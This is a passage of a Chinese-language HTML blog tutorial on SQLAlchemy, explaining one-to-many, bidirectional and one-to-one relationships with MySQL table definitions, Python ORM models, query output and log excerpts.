class="headerlink" title="1.一对多"></a>1.一对多</h4><blockquote><p>一对多,即A,B两个实体,A实体的属性a的数据对象可能需要多个实体B属性b的数据对象.而对于实体B的属性b来说,它只需要一个实体A属性a的数据对象.</p><p>所以,设置外键在实体B的属性b上,并指向了实体A的属性a.</p><p>如两张表<code>Parent_1</code>和<code>Child_1</code>存在如下关系:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10225.png" alt="10225"></p><hr><p><code>MySQL</code>创建语句：</p><pre class="line-numbers language-sql"><code class="language-sql">zuse sqlalchemy<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">-- 创建表</span><span class="token keyword">create</span> <span class="token keyword">table</span> parent_1<span class="token punctuation">(</span>    p_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    p_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">(</span>p_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">default</span> char <span class="token keyword">set</span> utf8 <span class="token keyword">comment</span> <span class="token string">"父亲表"</span><span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">table</span> child_1<span class="token punctuation">(</span>    c_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    c_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    p_id <span class="token keyword">int</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">(</span>c_id<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">constraint</span> p_c_1 <span class="token keyword">foreign</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>p_id<span class="token punctuation">)</span> <span class="token keyword">references</span> parent_1<span class="token punctuation">(</span>p_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">default</span> char <span class="token keyword">set</span> utf8 <span class="token keyword">comment</span> <span class="token string">"父亲表"</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p><code>SQLAlchemy</code>中对应模式<code>Model</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Time<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> DECIMAL<span class="token punctuation">,</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span>  relationship<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> and_<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span><span class="token keyword">class</span> <span class="token class-name">Parent_1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'parent_1'</span>    p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    p_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 注意，一对多 关系指定在 一的这里</span>    <span class="token comment" spellcheck="true"># 创建一个属性，指向类Child_1</span>    child <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Child_1'</span><span class="token punctuation">)</span><span class="token keyword">class</span>  <span class="token class-name">Child_1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'child_1'</span>    c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    c_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 注意，ForeignKey连接的是数据库的表</span>    p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'parent_1.p_id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建成功后,尝试添加数据.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 继续在上面的文件中添加</span><span class="token comment" spellcheck="true"># 添加数据</span>p1 <span class="token operator">=</span> Parent_1<span class="token punctuation">(</span>p_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> p_name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> Child_1<span class="token punctuation">(</span>c_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> c_name<span class="token operator">=</span><span class="token string">'Jack Child'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>add_all<span class="token punctuation">(</span><span class="token punctuation">[</span>p1<span class="token punctuation">,</span> c1<span class="token punctuation">]</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 查询数据</span>q1  <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Parent_1<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>Parent_1<span class="token punctuation">.</span>p_id<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q1<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 查询数据</span>q2 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Child_1<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>Child_1<span class="token punctuation">.</span>c_id <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-bash"><code class="language-bash">$ python 5一对多.py<span class="token operator">&lt;</span>__main__.Parent_1 object at 0x000001EAA1795DC8<span class="token operator">></span>SELECT child_1.c_id AS child_1_c_id, child_1.c_name AS child_1_c_name, child_1.p_id AS child_1_p_idFROM child_1WHERE child_1.c_id <span class="token operator">=</span> %<span class="token punctuation">(</span>c_id_1<span class="token punctuation">)</span>s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出,如果有<code>first()</code>会真正的执行语句,否则只会组成要执行的语句.通过查看日志可以更清晰的看到这点(并没有执行<code>q2</code>)</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cat</span> /mysql_data/localhost.logINSERT INTO parent_1 <span class="token punctuation">(</span>p_id, p_name<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span>1, <span class="token string">'Jack'</span><span class="token punctuation">)</span>2020-08-23T15:23:39.047828Z       23 Query    INSERT INTO child_1 <span class="token punctuation">(</span>c_id, c_name, p_id<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span>1, <span class="token string">'Jack Child'</span>, 1<span class="token punctuation">)</span>2020-08-23T15:23:39.054213Z       23 Query    COMMIT2020-08-23T15:23:39.069332Z       23 Query    ROLLBACK2020-08-23T15:23:39.075472Z       23 Query    SELECT parent_1.p_id AS parent_1_p_id, parent_1.p_name AS parent_1_p_name FROM parent_1 WHERE parent_1.p_id <span class="token operator">=</span> 1  LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>注意:导入的<code>relationsihp()</code> 方法,会自动的设定一对多的关系,我们只需要在<code>一</code> 的关系方设定一个类属性指向<code>多</code> 的关系方的类就可以了.比如<code>children = relationship(&#39;Child1&#39;)</code></p><pre class="line-numbers language-bash"><code class="language-bash">help<span class="token punctuation">(</span>relationship<span class="token punctuation">)</span>This corresponds to a parent-child or associative table relationship. The constructed class is an instance of :class:<span class="token variable"><span class="token variable">`</span>.RelationshipProperty<span class="token variable">`</span></span><span class="token keyword">.</span> A typical :func:<span class="token variable"><span class="token variable">`</span>.relationship<span class="token variable">`</span></span>, used <span class="token keyword">in</span> a classical mapping::    mapper<span class="token punctuation">(</span>Parent, properties<span class="token operator">=</span><span class="token punctuation">{</span>      <span class="token string">'children'</span><span class="token keyword">:</span> relationship<span class="token punctuation">(</span>Child<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 可以看到relationship() 函数对象中类似与一个mapping`对象,指明了父表与子表之间的联系.    </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-一对多双向关系"><a href="#2-一对多双向关系" class="headerlink" title="2.一对多双向关系"></a>2.一对多双向关系</h4><blockquote><p>以上,创建的都是单向关系.下面创建双向关系.</p><ul><li>单向关系:以上面为例,一个父亲知道自己有几个孩子,而孩子并不知道自己归属于那个父亲.</li><li>双向关系:以上面为例,一个父亲知道自己有几个孩子,而孩子也知道自己归属于那个父亲.</li><li>也就是说,通过<code>Parent_1</code> 可以检索到其拥有的<code>child</code> ,同时通过<code>Child_1</code> 也可以检索到其对应的<code>parent</code></li></ul><p>更多理解:客户知道自己有哪些订单,订单也知道自己归宿于哪个客户.也就是说,通过客户对象可以检索到其拥有哪些订单;同时,通过订单也可以查找到其对应的客户信息.这是符合我们业务逻辑需求.</p><p>对于上面的例子来说,只能通过<code>Parent_1.child</code> 来查看父表和子表的对应表,并不能从<code>Child_1</code>查找到父类的对应表.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 此为生成的 Parent1和 Child1的实例 p1.c1</span><span class="token comment" spellcheck="true"># p1 = Parent_11(p_id=1, p_name='Jack')</span><span class="token comment" spellcheck="true"># c1 = Child_1(c_id=1, c_name='Jack child', p_id=1)</span><span class="token comment" spellcheck="true"># 查看p1.child 此为 Parent_1和Child_1的对应表</span><span class="token keyword">print</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>child<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># sqlalchemy.orm.collections.InstrumentedList</span><span class="token comment" spellcheck="true"># 这是个list对象,从中读取它包含的内容</span><span class="token keyword">for</span> i <span class="token keyword">in</span> p1<span class="token punctuation">.</span>child<span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># &lt;__main__.Child1 object at 0x7f1219ca5710></span><span class="token comment" spellcheck="true"># 这是类 Child1的实例对象 内存地址</span><span class="token comment" spellcheck="true"># 转换成 10 进制</span><span class="token keyword">print</span><span class="token punctuation">(</span>int<span class="token punctuation">(</span><span class="token number">0x7f1219ca5710</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 139715718829840</span><span class="token comment" spellcheck="true"># 产看 c1的内存地址</span><span class="token keyword">print</span><span class="token punctuation">(</span>id<span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 139715718829840</span><span class="token comment" spellcheck="true"># 这基本验证了 relationship() 函数中是一个类 mapping 的对应表</span><span class="token comment" spellcheck="true"># 但是在 Child_1中没有与 Parent_1 对应的表结构</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果要建立双向对应关系,有2种方法,一种显式的创建,可读性好,一种是只指定一个函数<code>backref</code></p><hr><p>显示的创建：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Parent_2</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>     __tablename__ <span class="token operator">=</span> <span class="token string">'parent_1'</span>     p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>     p_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 指定 back_populates 要严格的指向 Child_2 中的属性值的名字parent</span>     child <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Child_2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'parent'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Child_2</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>     __tablename__ <span class="token operator">=</span> <span class="token string">'child_1'</span>     c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>     c_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 注意这里连接的数据库的表</span>     p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'parent_1.p_id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 指定 back_populates 要严格的指向 Parent_2 中的属性值的名字child</span>     parent<span class="token operator">=</span>relationship<span class="token punctuation">(</span><span class="token string">'Parent_2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'child'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果是在命令行创建,因为<code>Table</code> 对象<code>Parent_1</code>,<code>Child_1</code> ,也就是表映射已经创建完了,所以不能映射上,所以需要重开窗口从新创建.</p><hr><p>使用<code>backref</code></p><ul><li>使用这个函数,只需要在父类中指向子类的属性就可以了,子类并不要去创建属性.相对的可读性没有那么好.</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Parent_2</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>     __tablename__ <span class="token operator">=</span> <span class="token string">'parent_1'</span>     p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>     p_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 指定 back_populates 要严格的指向 Child_2 中的属性值的名字parent</span>     child <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Child_2'</span><span class="token punctuation">,</span> backref<span class="token operator">=</span><span class="token string">'parent'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>验证双向连接</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Time<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> DECIMAL<span class="token punctuation">,</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span>  relationship<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> and_<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span><span class="token keyword">class</span> <span class="token class-name">Parent_3</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'parent_1'</span>    p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    p_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    child <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Child_3'</span><span class="token punctuation">,</span>  back_populates<span class="token operator">=</span><span class="token string">'parent'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Child_3</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'child_1'</span>    c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    c_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 注意这里连接的数据库的表</span>    p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'parent_1.p_id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parent <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Parent_3'</span><span class="token punctuation">,</span>  back_populates<span class="token operator">=</span><span class="token string">'child'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 插入数据</span>p1 <span class="token operator">=</span> Parent_3<span class="token punctuation">(</span>p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> p_name<span class="token operator">=</span><span class="token string">'Harry'</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> Child_3<span class="token punctuation">(</span>c_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> c_name<span class="token operator">=</span><span class="token string">'Harry child 1'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>c2 <span class="token operator">=</span> Child_3<span class="token punctuation">(</span>c_id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> c_name<span class="token operator">=</span><span class="token string">'Harry child 2'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 添加</span>session<span class="token punctuation">.</span>add_all<span class="token punctuation">(</span><span class="token punctuation">[</span>p1<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">]</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 查看双向连接</span><span class="token comment" spellcheck="true"># 注意,查看实例的属性,而不是类的属性</span><span class="token keyword">print</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>child<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>id<span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>id<span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c1<span class="token punctuation">.</span>parent<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>id<span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c2<span class="token punctuation">.</span>parent<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>id<span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">&lt;</span>__main__<span class="token punctuation">.</span>Child_3 object at <span class="token number">0x000002155A389688</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>__main__<span class="token punctuation">.</span>Child_3 object at <span class="token number">0x000002155A3AA8C8</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token number">2290731015624</span><span class="token number">0x2155a355dc8</span><span class="token operator">&lt;</span>__main__<span class="token punctuation">.</span>Parent_3 object at <span class="token number">0x000002155A355DC8</span><span class="token operator">></span><span class="token number">2290731226760</span><span class="token operator">&lt;</span>__main__<span class="token punctuation">.</span>Parent_3 object at <span class="token number">0x000002155A355DC8</span><span class="token operator">></span><span class="token number">2290731362504</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行<code>python</code>终端</p><pre class="line-numbers language-python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span> hex<span class="token punctuation">(</span><span class="token number">0x000002155A355DC8</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'0x2155a355dc8'</span>In <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span> hex<span class="token punctuation">(</span><span class="token number">0x000002155A389688</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'0x2155a389688'</span>In <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span> hex<span class="token punctuation">(</span><span class="token number">0x000002155A3AA8C8</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'0x2155a3aa8c8'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即可验证,指向是双向的.</p></blockquote><h4 id="3-一对一关系"><a href="#3-一对一关系" class="headerlink" title="3.一对一关系"></a>3.一对一关系</h4><blockquote><p>一对一本质上是双向关系.双方都需要设置反向对应<code>back_popultaes</code> .但是为了表示一对一的关系,需要设置<code>relationshiop()</code>的参数<code>uselist=False</code>.</p><p>查看<code>uselist</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> help<span class="token punctuation">(</span>relationship<span class="token punctuation">)</span><span class="token punctuation">:</span>param uselist<span class="token punctuation">:</span>a boolean that indicates <span class="token keyword">if</span> this property should be loaded <span class="token keyword">as</span> alist <span class="token operator">or</span> a scalar<span class="token punctuation">.</span> In most cases<span class="token punctuation">,</span> this value <span class="token keyword">is</span> determined automatically by <span class="token punctuation">:</span>func<span class="token punctuation">:</span>`<span class="token punctuation">.</span>relationship` at mapper configuration time<span class="token punctuation">,</span> based on the type <span class="token operator">and</span> direction of the relationship <span class="token operator">-</span>       one to many forms a list<span class="token punctuation">,</span>      many to one forms a scalar<span class="token punctuation">,</span>      many to many <span class="token keyword">is</span> a list<span class="token punctuation">.</span>If a scalar <span class="token keyword">is</span> desired where normally a list would be present<span class="token punctuation">,</span> such <span class="token keyword">as</span> a bi<span class="token operator">-</span>directional one<span class="token operator">-</span>to<span class="token operator">-</span>one relationship<span class="token punctuation">,</span> set <span class="token punctuation">:</span>paramref<span class="token punctuation">:</span>`<span class="token operator">~</span><span class="token punctuation">.</span>relationship<span class="token punctuation">.</span>uselist` to  <span class="token boolean">False</span><span class="token punctuation">.</span>The <span class="token punctuation">:</span>paramref<span class="token punctuation">:</span>`<span class="token operator">~</span><span class="token punctuation">.</span>relationship<span class="token punctuation">.</span>uselist` flag <span class="token keyword">is</span> also available on an existing <span class="token punctuation">:</span>func<span class="token punctuation">:</span>`<span class="token punctuation">.</span>relationship` construct <span class="token keyword">as</span> a read<span class="token operator">-</span>only attribute<span class="token punctuation">,</span>which can be used to determine <span class="token keyword">if</span> this <span class="token punctuation">:</span>func<span class="token punctuation">:</span>`<span class="token punctuation">.</span>relationship` deals <span class="token keyword">with</span> collections <span class="token operator">or</span> scalar attributes<span class="token punctuation">:</span><span class="token punctuation">:</span>    <span class="token operator">>></span><span class="token operator">></span> User<span class="token punctuation">.</span>addresses<span class="token punctuation">.</span>property<span class="token punctuation">.</span>uselist    <span class="token boolean">True</span><span class="token triple-quoted-string string">"""一个布尔值，指示是否应将此属性加载为列表或标量。 在大多数情况下，此值是在映射器配置时由.func：`.relationship`根据关系的类型和方向自动确定的-       一对多的列表       多对一形成标量，       多对多是一个列表。 如果需要一个标量，通常在其中会出现一个列表，例如双向一对一关系，则将paramref：〜.relationship.uselist设置为False。"""</span><span aria-hidden="true" 